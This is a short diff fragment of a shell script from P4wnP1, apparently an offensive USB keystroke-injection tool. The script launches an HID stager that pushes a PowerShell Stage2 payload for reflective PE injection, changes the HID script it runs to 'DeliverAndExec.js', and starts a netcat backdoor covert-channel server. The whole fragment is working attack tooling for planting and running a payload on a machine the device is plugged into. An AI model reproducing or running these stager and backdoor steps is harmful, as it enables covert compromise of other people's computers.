@@ -18,7 +18,7 @@ echo "[*] Starting HID stager for Reflective PE Injection covert channel payload
 
 
 python2 /usr/local/P4wnP1/legacy/hidstager.py -s -i /usr/local/P4wnP1/legacy/Stage2.ps1 -o $hidraw &
-P4wnP1_cli hid run -n wifi_covert_channel.js > /dev.null
+P4wnP1_cli hid run -n DeliverAndExec.js > /dev.null
 
 if ! ps -aux | grep netcat | grep -q -v grep; then
         echo "[*] Start backdoor covert channel server and attach to screen session..."
